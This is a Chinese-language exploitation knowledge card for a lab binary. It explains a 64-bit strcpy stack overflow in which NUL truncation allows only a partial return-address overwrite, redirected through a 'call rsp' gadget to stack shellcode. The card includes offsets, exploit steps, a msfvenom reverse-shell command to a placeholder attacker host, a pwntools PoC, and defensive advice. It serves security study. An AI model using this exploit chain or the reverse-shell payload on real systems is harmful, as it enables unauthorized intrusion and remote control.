---
id: binary-pwn-stack-strcpy-nul-truncated-partial-rip-call-rsp
title: 64 位 strcpy 栈溢出因 NUL 截断只能覆盖低 4 字节 RIP：借同段 call rsp gadget 跳 shellcode
type: scenario
domain: binary
path: binary/pwn/stack
technique: strcpy-nul-truncated-partial-rip-overwrite-call-rsp
aliases:
- strcpy 截断 返回地址
- 只能覆盖 4 字节 RIP
- 低 4 字节返回地址覆盖
- call rsp gadget
- 无空字节 shellcode
- 64 位栈溢出 部分覆盖
tags:
- pwn
- stack-overflow
- strcpy
- partial-overwrite
- call-rsp
- shellcode
- x86-64
- linux
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V615
  verified_at: '2026-11-12T20:49:46+08:00'
  notes: 已对照原文与全部37张截图核对：panel 的 recv(buf,0x1000)→handlecmd 中 char dest[112];strcpy(dest,a1)(图22)、pattern 偏移 RBP 112/RIP 120(图27)、checksec No PIE/No canary/GNU_STACK missing 栈可执行(图24)、jmpcall 找到 0x400cfb call rsp(图33)、msfvenom -b '\x00' 生成119字节 shellcode+1 NOP(图34)、低4字节 0x400cfb 跳 shellcode 反连 root/flag(图20/21/35/36) 均一致。已修正步骤4原“再多的 C 不会进入返回地址”的错误解释：图32 显示 6 个 C 时 RIP=0xa43434343434343（echo 换行 0x0a 也进入），8 字节返回地址均可写，低4字节限制来自 p64 高位空字节被 strcpy 截断；同步修正触发条件表述。与 jmp rsp 滑板、任意空字节写返回地址、PIE 部分覆盖等既有卡为 related 非同链，保留。原文为自定义二进制，无受影响版本，未设 versions。未在本机复现。
---

## 一句话结论

64 位非 PIE 程序中 `strcpy` 把用户输入复制进固定栈缓冲区时，复制会在第一个 `\x00` 处停止，因此 `p64(gadget)` 的高位空字节不会被写入，返回地址只有低 4 字节可控；利用原返回地址高位保持不变（如 `0x000000000040xxxx`）这一点，把低 4 字节改成同段内的 `call rsp`/`jmp rsp` gadget，并在栈上放无空字节 shellcode，即可在可执行栈上拿到 shell。

## 原理

- 典型入口：网络守护进程 `recv` 最多 0x1000 字节到 `buf`，再调用 `handlecmd(buf, fd)`；`handlecmd` 内 `char dest[112]; strcpy(dest, a1);`，无长度校验，构成栈溢出。
- 偏移：112 字节填满 `dest`，再 8 字节覆盖保存的 RBP，第 120 字节起覆盖返回地址（pattern_create/pattern_offset 可确认 `RBP<-112`、`RIP<-120`）。
- NUL 截断：`strcpy` 复制到第一个 `\x00` 即停止并写入终止符。若发送 `p64(0x400cfb)`（`fb 0c 40 00 00 00 00 00`），实际只写入 `fb 0c 40 00` 和终止符 `00`，高 4 字节不会被后续字节覆盖。
- 为什么仍能劫持：原返回地址属于非 PIE 的 `0x000000000040xxxx` 段，高 4 字节本来就是 `00 00 00 00`；把低 4 字节改成 `0x00400cfb` 后，完整地址即 `0x0000000000400cfb`，落在同一二进制段内，无需泄露地址。
- gadget 选择：在二进制中搜索 `call rsp`/`jmp rsp`（示例 `0x400cfb: call rsp`）。返回地址指向该 gadget 后，`rsp` 正指向缓冲区中 shellcode 的起始位置，`call rsp` 直接跳过去执行。
- shellcode 约束：`strcpy` 会在第一个 `\x00` 处截断，因此 shellcode 必须无空字节（`msfvenom -b '\x00'`）；示例 `linux/x64/shell_reverse_tcp` 编码后 119 字节，加 1 字节 NOP 正好 120 字节（112 缓冲区 + 8 RBP），再跟 4 字节返回地址。
- 可执行栈：示例二进制 `checksec` 显示 `No PIE`、`No canary`、`GNU_STACK missing`（栈可执行）、RWX 段；若栈不可执行，则需改为 ROP 而非直接跳 shellcode。
- 调试技巧：守护进程每次连接 `fork` 子进程，gdb 默认跟父进程看不到漏洞现场；用 `set follow-fork-mode child` 与 `set detach-on-fork off` 跟踪子进程。

## 触发条件

- 目标为 64 位 Linux ELF，存在 `strcpy`/`sprintf` 等无边界复制到固定栈缓冲区的路径，且输入来自网络/argv。
- 二进制非 PIE（或已知基址），使目标 gadget 与原返回地址共享高 4 字节（如 `0x000000000040xxxx`），低 4 字节覆盖后地址仍落在可执行段。
- 栈可执行（`GNU_STACK` 缺失/RWX），或能找到可用的 `call rsp`/`jmp rsp` gadget。
- 能发送不含 `\x00` 的 shellcode，或使用编码器去除坏字节。
- 溢出偏移可确定（pattern 定位），且目标进程无 canary 或 canary 可绕过。

## 利用步骤

1. 确认防护：`checksec` 查看 PIE/NX/Canary/RELRO；示例为 No PIE、No canary、栈可执行。
2. 触发崩溃：发送 500 个 `A`，观察 `RIP=0x4141414141414141`，确认返回地址可控。
3. 定位偏移：`pattern_create.rb -l 500` 生成模式串发送，`pattern_offset.rb` 得到 RBP 偏移 112、RIP 偏移 120。
4. 验证覆盖范围：112 A + 8 B + 4 C 时 RIP 变为 `0x43434343`；继续追加 C 会继续覆盖返回地址的更高字节（原测试中 echo 的换行 `0x0a` 也会进入），说明 8 字节返回地址都可被写入；真正把 exploit 限制在低 4 字节的是 `p64` 地址中的高位 `\x00` 被 `strcpy` 截断，而不是多余字节写不进去。
5. 找 gadget：在 gdb/peda 中 `jmpcall` 或 ROPgadget 搜索 `call rsp`/`jmp rsp`，选同段地址（如 `0x400cfb`）。
6. 生成 shellcode：`msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -b '\x00' -f python`，得到无空字节 payload。
7. 组装：`shellcode(119) + \x90(1)` 填满 120 字节，再跟 `\xfb\x0c\x40\x00`（`0x400cfb` 小端低 4 字节）；发送后监听端口收 shell。
8. 若目标为远程守护进程且 fork，gdb 用 `set follow-fork-mode child` + `set detach-on-fork off` 调试子进程。

## PoC

```python
from pwn import *

# msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=3322 -b '\x00' -f python
shellcode = b""  # 119 字节无空字节 shellcode，此处省略
payload = shellcode + b"\x90"          # 120 字节，填满 dest[112]+RBP[8]
payload += p32(0x400cfb)               # call rsp；strcpy 在 \x00 处截断，只写入低 4 字节

r = remote("TARGET", 31337)
r.recv()
r.send(payload)
print("sent")
```

```text
预期：目标返回地址变为 0x0000000000400cfb，执行 call rsp 跳到栈上 shellcode，
攻击机监听端口收到反弹 shell（示例为 root 权限）。
```

说明：地址与偏移来自具体二进制示例（buffer 112、RBP 8、RIP 偏移 120、gadget 0x400cfb）；实际目标需重新定位偏移与 gadget，并确认栈可执行。PoC 未在本机执行，仅用于授权测试。

## 变体与关联

- 变体：若只有 1~2 字节可控，可选择同页内后门/`ret2text`；若高字节也会被覆盖，则需先泄露 PIE/栈地址。
- 变体：栈不可执行时改用 ROP（`pop rdi; ret` + system/execve），或 `mprotect` 改栈权限后再跳 shellcode。
- 变体：`sprintf`/`strcat` 等同样以 NUL 结尾的复制函数有类似截断特性；输入经 URL 解码/宽字符转换时还需考虑额外 NUL。
- 关联：[[binary-pwn-stack-arbitrary-null-byte-return-redirect-shellcode]]（任意空字节写返回地址低位）、[[ctf-pwn-shellcode-landing-jmp-rsp-repeat-padding-openat-sendfile]]（jmp rsp 滑板思路）、[[binary-pwn-stack-pie-page-bruteforce-fork-partial-overwrite]]（部分覆盖返回地址低字节的 PIE 场景）。
- 边界：strcpy 前有长度校验、输入不能含 shellcode 所需字节、栈不可执行且无 ROP gadget、或 canary 存在且无法泄露时，本链不成立。

## 检测与防御

- 检测：网络守护进程收到超长输入后崩溃（SIGSEGV，RIP 被 A/pattern 覆盖）；进程派生子进程后异常退出；栈上出现 shellcode 特征（如 `\x48\x31\xc9` 开头）与 `call rsp` 目标地址。
- 防御：用 `strncpy`/`snprintf` 等有界复制并检查返回值；编译开启 `-fstack-protector-strong`、`-z noexecstack`、PIE、Full RELRO；对网络输入做长度与字节白名单校验。
- 加固：以最小权限运行守护进程；部署 seccomp/AppArmor 限制 execve；监控异常崩溃与进程派生 shell 的行为。
